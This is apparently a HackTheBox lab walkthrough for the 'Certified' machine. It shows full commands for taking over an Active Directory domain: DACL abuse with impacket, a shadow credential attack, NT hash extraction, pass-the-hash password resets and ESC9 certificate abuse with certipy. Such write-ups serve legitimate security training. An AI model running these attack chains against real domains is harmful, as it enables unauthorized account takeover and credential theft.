---
layout: post
date: 2025-3-26
title: "HTB: Certified Machine Walkthrough"
categories: [PenTest Report]
tags: [PenTest,HackTheBox,Windows,Active Directory]
img_path: /assets/htb-certified/
render_with_liquid: false
---

![HackTheBox Machine Rank](HackTheBox Machine Rank.png)
_HTB Certified Machine Completion_

## Machine Summary
As directly stated within the machine's notes: "*As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09*". Therefore, we start with a valid domain user account. Using these credentials we begin our enumeration process by running BloodHound-python. Where a potential DACL attack chain becomes clear. The initial domain account given to us has *WriteOwner* privileges over the Management group, which can be abused to add judith.mader to that group. The Management group has *GenericWrite* privileges over the management_svc service account, which can be abused to perform a shadow credential attack, compromising the management_svc account and the account's NT hash. From here the user.txt flag can be retrieved. 

The first step of privilege escalation starts with the *GenericAll* privileges that management_svc has over the ca_operator account, Which can be abused to change the ca_operator's password, fully compromising the account. Enumerating the domain's ADCS certificate service a certificate template is found to be vulnerable to ESC9 which takes advantage of the GenericAll permissions on the enrollee account in combination with the *NoSecurityExtension* enrollment flag. 

## Nmap
Even though this is a simulated Active Directory (AD) machine with given credentials we will start off by enumerating the server. I will first add what I suspect to be the machine's domain name to `/etc/hosts`:
```bash
echo -e '\n# HTB Certified\n10.129.231.186\tcertified.htb'
```

### TCP Port & Service Scan
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ sudo nmap -p- -sCV -T4 certified.htb -oN nmap-base.txt 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 12:48 EDT
Nmap scan report for certified.htb (10.129.231.186)
Host is up (0.040s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-14 23:53:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-14T23:55:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-14T23:55:22+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-14T23:55:21+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-14T23:55:22+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
59688/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-03-14T23:54:43
|_  start_date: N/A
```
- `-p-` : Run scan against all 65536 TCP Ports. 
- `-sCV` : Specifies Nmap to run both a default script (`-sC`) and version detection (`-sV`) scans.
- `-T4` : The second most aggressive option for the scan (very loud, but quick).
- `certified.htb` : Target of the Nmap scan.
- `-oN nmap-base.txt` : Store the results in text format into the specified filename.

The above Nmap output displays the Fully Qualified Domain Name (FQDN) of the DC: `commonName=DC01.certified.htb`. Update to our `/etc/hosts` enter for the certified machine:

![Updated /etc/hosts](Pasted image 20250314131710.png)
_FQDN Added to /etc/hosts_

### UDP Scan
Running a UDP scan on top of the TCP scan to gain a wholistic view of every available port on the DC.
```bash
┌──(kali㉿kali)-[~/HTB/Certified]
└─$ sudo nmap --top-ports 200 -sU 10.129.231.186 -T4 -oN nmap-UDP.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 12:48 EDT
Nmap scan report for certified.htb (10.129.231.186)
Host is up (0.043s latency).
Not shown: 197 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
```
- `--top-ports 200` : Run UDP Scan against only the top 200 most commonly found UDP service ports.
- `-sU` : Tells Nmap to run a UDP Scan (requires sudo permissions).
- `10.129.231.186` : IP Address of the target.
- `-T4` : The second most aggressive option for the scan (very loud, but quick).
- `-oN nmap-UDP.txt` : Store the results into a plaintext format into the specified filename.

## BloodHound-Python Domain Enumeration
We start off with a valid domain account's credentials, and can access LDAP against the Domain Controller (DC). Therefore, I will start my enumeration process by running [BloodHound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce) (using the BloodHound Community Edition (CE) support Branch). 
```bash
bloodhound-ce-python -c all -u judith.mader -p 'judith09' -d certified.htb -dc dc01.certified.htb -ns 10.129.231.186 --zip
```
- `-c all` : Execute all collection methods (e.g. Group, LocalAdmin, Acl, Trusts, etc.), except LoggedOn.
- `-d certified.htb` : Specifying the target domain. 
- `-dc dc01.certified.htb` : FQDN of the DC.
- `-ns 10.129.231.186` : Specifying the IP address of the DC as the target nameserver. Without this option the tool fails to resolve the FQDN of the DC.
- `--zip` : Store the results into a ZIP format to be uploaded to BloodHound.

We can see bloodhound-ce-python was able to successfully enumerate the domain:
![BloodHound Successful Enumeration](Pasted image 20250314131831.png)
_BloodHound Successful Execution_

### Extracting Domain Users
After ingesting the BloodHound collection data we can start our enumeration off by getting a list of all domain users. Enter the following custom cypher query:
```cypher
MATCH (u:User) RETURN u
```

Then export the cypher queries' results, which will be stored in JSON format.
![BloodHound Export Results](Pasted image 20250314134644.png)
_Export BH Cypher Query Results_

I wrote a small Python script to extract the usernames from the JSON output. One could also use the CLI tool `jq` in order to extract the usernames, but I like to practice my Python skills whenever possible. 
```python
#!/usr/bin/python3
import json
import pathlib

# Read Exported JSON File:
bh_raw = pathlib.Path("bh-graph.json").read_text()
bh_json = json.loads(bh_raw)

# Read through each user's JSON values
for each_user in bh_json['data']['nodes'].values():
    # Print user
    print(each_user['label'].lower())
```
![Extract Users Python Script Output](Pasted image 20250314134448.png)
_Extract Usernames With Python Script Output_

### Visualizing Attack Path
From this initial BloodHound enumeration we can visualize the attack path to pivoting our permissions within the domain. Our initial domain user `judith.mader` has `WriteOwner` permissions over the `Management` group. 

![Judith to Management Gropu](Pasted image 20250326193406.png)
_judith.mader to Management Group Path_

Viewing the details for the Management group object we can see that members within this group have `GenericWrite` permissions over the `management_svc` account.

![Management Group to management_svc Account](Pasted image 20250326193909.png)
_Management Group to management_svc Account Path_

Viewing the details for the `management_svc` service account object we can see that they have `GenericAll` permissions over `ca_operator` group. Ignoring the the name of the machine, this heavily indicates that Active Directory Certificate Services (ADCS) are configured on the DC.

![management_svc to ca_operator Path](Pasted image 20250326194206.png)
_management_svc to ca_operator Path_

### Summary of Domain Attack Path
With all of the above information gathered before performing any active testing, minus Nmap scanning, we can get a clear idea of the steps. Note, the following three (3) steps are the potential paths as it stands with the enumeration data currently possessed, prior to any active exploitation. 
1. Use `WriteOnwer` permissions to add `judith.mader` to the `Management` group.
2. Use `GenericWrite` permissions as part of the `Management` group to perform a Shadow Credential Attack, gaining access to the `maangement_svc` service account. 
3. Use the `GenericAll` permission to change the password the `ca_operator` service account. 
We can use BloodHound's Pathfinding feature in order to visualize this attack chain wholistically.

![BH Pathfinding](Pasted image 20250326213353.png)
_BloodHound Pathfinding Visual_

## 1. judth.mader -> Management Group
### 1a. Change Management Group Object Ownership 
In order to add the `judith.mader` user to the `Management` group we first need to abuse the `WriteOwner` permission to change the ownership of the object to our controlled user. To accomplished this [impacket](https://github.com/fortra/impacket)'s `owneredit.py` script is utilized:
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'CERTIFIED.HTB'/'judith.mader':'judith09'
```
- `-action write` : Specify that we want to overwrite the current owner of the object, which as seen by the screenshot of the Domain Admins group. 
- `-new-owner 'judith.mader'` : Specify our controlled domain account to become the new owner of the Management group object. 
- `-target 'Management'` : Target object to change ownership.
- `'CERTIFIED.HTB'/'judith.mader':'judith09'` : Identity of our controlled domain account to authenticate the operation. 

The ownership is successfully modified as illustrated by the script's output.

![Impacket Owneredit Execution](Pasted image 20250314135922.png)
_Impacket Owneredit Successful Execution_

### 1b. Add `WriteMembers` Permission Over Object
With ownership over the Management group the `WriteMembers` permission can be granted in order to add ourselves to the group. To accomplish this [impacket](https://github.com/fortra/impacket)'s `dacledit.py` script is utilized. 
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'CERTIFIED.HTB'/'judith.mader':'judith09'
```
- `-action write` : Specify that we want to add a new permission over the target Management group object.
- `-rights 'WriteMembers'` : DACL permission to be granted.
- `-principal 'judith.mader'` : The user who the WriteMembers permission is going to be granted to. 
- `-target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB'` : The distinguished name for the Management group. 
- `'CERTIFIED.HTB'/'judith.mader':'judith09'` : Identity of our controlled domain account to authenticate the operation. 

The script's output illustrates successful execution, granting us the ability to add members to the Management group.
![Impacket Dacledit Execution](Pasted image 20250314140316.png)
_Impacket Dacledit Execution_

### 1c. Add `judith.mader` to `Management` Group
Once Steps 1a  and 1b have successfully completed then the judith.mader domain user can be added to the Management group using the `net` CLI tool. 
```bash
# ADD TO GROUP
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"

# VERIFY GROUP MEMBERSHIP
net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"
```
- `-U "certified.htb"/"judith.mader"%"judith09"` : User to authenticate as and perform the net rpc operation. 
- `-S "10.129.231.186"` : Target server, in this case the DC. 

![Successful Management Group User Addition](Pasted image 20250314141216.png)
_Successful Management Group User Addition_

### 1d. Adding Steps 1a-c Into Bash Script
There is some type of scheduled task on the server that is resetting the changes made. Therefore, its best to place all of the execution steps into a single bash script that can be ran in order to get back to the same level of permission after running step 1c. 

![Machine Resetting DACL Changes](Pasted image 20250314143202.png)
_Scheduled Task Resetting Changes Periodically_

Execute the following bash script to perform all of the above DACL abuse vectors at once. 
```bash
#!/usr/bin/sh

# STEP 1a
echo "\n[+] Changing Management Object Owernship"
impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'CERTIFIED.HTB'/'judith.mader':'judith09'

# STEP 1b
echo "\n[+] Adding Management Object WriteMember DACL Permission"
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'CERTIFIED.HTB'/'judith.mader':'judith09'

# STEP 1c
echo "\n[+] Adding judith.mader to Group"
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"

echo "\n[+] Verify Group Membership"
net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"
```

## 2. Management Group -> management_svc Service Account
The judith.mader domain user is a member of the Management group. Therefore, we can leverage the `GenericWrite` permissions the group has over the management_svc service account in order to perform a shadow credential attack. This attack is explained quite thoroughly in Elad Shamir's [Shadow Credential Attack]](https://eladshamir.com/2021/06/21/Shadow-Credentials.html) blog post. In essence we are going to be modifying management_svc's `msDS-KeyCredentialLink` to add a key credential. This will allow us to "*perform Kerberos authentication as that account using PKINIT*". 

### 2a. Shadow Credential Attack Against management_svc
First step is to perform the Shadow Credential attack, adding key credentials to management_svc's `msDS-KeyCredentialLink` user attribute. To accomplish the [pyWhisker](https://github.com/ShutdownRepo/pywhisker) script is utilized. 
```bash
python3 pywhisker/pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --target 'management_svc' --action 'add'
```
- `-d 'certified.htb'` : Target domain. 
- `--target 'management_svc'` : The target of the shadow credential attack. 
- `--action 'add'` : Add the key credentials to the target account's msDS-KeyCredentialLink attribute

Execution of the shadow credential is successful, as illustrated by pywhisker's output:
![Pywhisker Successful Execution](Pasted image 20250314143317.png)
_Pywhisker Successful Execution_

### 2b. Request Valid TGT
The pywhisker repository outlines next steps once key credentials have been added to the target account. In order to accomplish these steps we must first clone dirkjanm's [PKINITtools](https://github.com/dirkjanm/PKINITtools) repository locally onto the system. 
![Pywhisker Next Abuse Steps](Pasted image 20250314144544.png)
_Shadow Credential Attack Next Abuse Steps_

Utilize pywhisker's generated PFX file and password as parameters for `gettgtpkinit.py` in order to request a valid TGT. 
```bash
python3 gettgtpkinit.py -cert-pfx ~/HTB/Certified/I0G1imD1.pfx -pfx-pass 'MsA4HfToDie7UiJTF5BS' certified.htb/management_svc ~/HTB/Certified/manage_svc.ccache
```
- `-cert-pfx ~/HTB/Certified/I0G1imD1.pfx` : Pywhisker generated PFX file for use with PKINIT authentication.  
- `-pfx-pass 'MsA4HfToDie7UiJTF5BS'` : Password for the PFX file generated by pywhisker.
- `certified.htb/management_svc` : Account for which the PFX file represents for PIKINIT authentication. 
- `~/HTB/Certified/manage_svc.ccache` : Filename to store the generated Kerberos credential cache. 

![Requesting TGT](Pasted image 20250314145053.png)
_Requesting TGT for management_svc Account_

Set the populated Kerberos credential cache as our `KRB5CCNAME` environment variable:
```bash
export KRB5CCNAME=$(pwd)/manage_svc.ccache
```
![Setting KRB5CCNAME Environment Variable](Pasted image 20250314145237.png)
_Setting KRB5CCNAME Environment Variable_

### 2c.  Retrieve management_svc NT Hash
With a valid TGT stored in Kerberos credential cache we can utilize `getnthash.py` in order to retrieve the management_svc account's NT hash. 
```bash
python3 /opt/PKINITtools/getnthash.py -key 18916c485c9643149d25ac4acec4aa5d537c9e105329ace1be3fba80b9db421e certified.htb/management_svc
```
`-key 18916c485c...<snip>` : Kerberos encryption key extracted from TGT, outputted by the `gettgtpkinit.py` script.
![Extracting management_svc NT Hash](Pasted image 20250326205158.png)
_Extracting management_svc NT Hash_

We can verify this NT hash using [NetExec](https://github.com/Pennyw0rth/NetExec), proving that we have compromised the management_svc user. 
```bash
netexec smb dc01.certified.htb -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
```

![Compromised management_svc Account Proof](Pasted image 20250314145507.png)
_Compromised management_svc Account Proof_
> I skipped right to privilege escalation, but for anyone curious this step is when the `user.txt` flag can be retrieved. 
{: .prompt-info }

## 3. management_svc -> ca_operator
The management_svc account is now compromised and under our control. Therefore, we can leverage the `GenericAll` permissions that management_svc has over ca_operator in order to change the account's password. Since we are working with the management_svc's NT hash we need to utilize the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) tool in order to change ca_operator's password using pass-the-hash method:
```bash
./pth-net rpc password "ca_operator" 'password123!' -U 'certified.htb'/'management_svc'%'aad3b435b51404eeaad3b435b51404ee':'a091c1832bcdd4677c28b5a6a1295584' -S '10.129.131.186'
```
- `password "ca_operator" 'password123!'` : Change ca_operator's password to 'password123!'. 
- `'certified.htb'/'management_svc'%'aad3b435b51404eeaad3b435b51404ee':'a091c1832bcdd4677c28b5a6a1295584'` : Domain account that to authenticate. This includes an empty LM hash (aad3b435b51404eeaad3b435b51404ee) and the management_svc's NT hash.
- `-S '10.129.131.186'` : Target server, which in this case is the DC.

Despite the `pth-net` tool not outputting any successful execution notification, the password for the ca_operator is changed to 'password123!'. 
![Changing ca_operator Password](Pasted image 20250314151713.png)
_Changing ca_operator Password_

## 4. ca_operator -> Administrator
With the ca_operator's account now compromised we can utilize [certipy](https://github.com/ly4k/Certipy) in order to enumerate the domain's AD Certificate Services (ADCS). 
### 4a. Finding Vulnerable Certificate Templates
Use certipy to search for any vulnerable certificate templates:
```bash
certipy-ad find -u ca_operator -p 'password123!' -target dc01.certified.htb -vulnerable
```
- `-target dc01.certified.htb` : Run enumeration against the specified target server.
- `-vulnerable` : Return vulnerable certificate templates.

The following is outputted by certipy-ad:
```bash
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```
From the above output we can gather the following details:
1. Certificate Authority : `certified-DC01-CA`
2. Vulnerable Certificate Template : `CertifiedAuthentication`
3. Enrollment Rights : `CERTIFIED.HTB\operator ca`
4. Vulnerable ESC: `ESC9 - 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension`
5. Enrollment Flag : `NoSecurityExtension`

### 4b. ESC9 Privilege Escalation
Certipy's [README](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10) contains a link to a Medium [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7#:~:text=ESC9%20%E2%80%94%20No%20Security%20Extension] which explains the necessary criteria for abusing ESC9 for privilege escalation.
![ESC9 Absue Details](Pasted image 20250314164000.png)
_ESC9 High-Level Abuse Details_

The management_svc user fits the criteria as it has `GenericAll` permissions over the ca_operator account, which can enroll in the CertifiedAuthentication ESC9 vulnerable certificate template. Certipy-ad is going the primary tool to abuse this privilege escalation vector. 

First, Use `GenericAll` permissions to change the ca_operator's [UserPrincipalName](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/plan-connect-userprincipalname) (UPN), the Microsoft Entra username for the user accounts, attribute to Administrator. 
```bash
certipy-ad account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn Administrator -target "10.129.231.186"
```
- `-username 'management_svc@certified.htb'` : User that has atleast GenericWrite permissions over target enrollee account. 
- `-hashes 'a091c1832bcdd4677c28b5a6a1295584'` : NT hash of management_svc
- `-user ca_operator` : Target user to update their UPN attribute. 
- `-upn Administrator` : Username to change `ca_operator`'s UPN to.
- `-target "10.129.231.186"` : Target Server, in this case the DC.

Certipy's output indicates a successful change of ca_operator's UPN to Administrator.
![Changing ca_operator's UPN](Pasted image 20250314164102.png)
_Successfully Changing ca_operator's UPN to Administrator_

Second, request a certificate from the `CertifiedAuthentication` template. This is going to authenticate using ca_operator's credentials. However, the certificate is going to use ca_operator's UPN attribute as the username for the certificate, which is the Administrator user. 
```bash
certipy-ad req -username 'ca_operator@certified.htb' -p 'password123!' -target "10.129.231.186" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
```
- `-ca 'certified-DC01-CA'` : Certificate Authority to request the certificate from. 
- `-template 'CertifiedAuthentication'` : Target certificate template. 

Certipy's output illustrates a successful enrollment, with the UPN for the certificate set to Administrator.
![Request Vulnerable Certificate](Pasted image 20250314164153.png)
_Requesting Vulnerable Certificate_

Third, revert the ca_operator's UPN back to its previous state.
```bash
certipy-ad account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb
```
![Reverting ca_operator's UPN](Pasted image 20250314165149.png)
_Reverting ca_operator's UPN_

Finally, authenticate to the DC using the PFX and obtain the NT hash for the Administrator. 
```bash
certipy-ad auth -pfx administrator.pfx -domain 'certified.htb'
```
- `-pfx administrator.pfx` : PFX file generated in the second ESC9 abuse step above.
![Retrieve Administator NT Hash](Pasted image 20250314165242.png)
_Administrator NT Hash Retrieved_

We can then verify a successful domain dominance using netexec. With that we have fully compromised the certified.htb machine. 
```bash
netexec smb dc01.certified.htb -u Administrator -H '0d5b49608bbce1751f708748f67e2d34' -x 'whoami'
```
![Domain Compromise Proof](Pasted image 20250314165322.png)
_Domain Compromised_
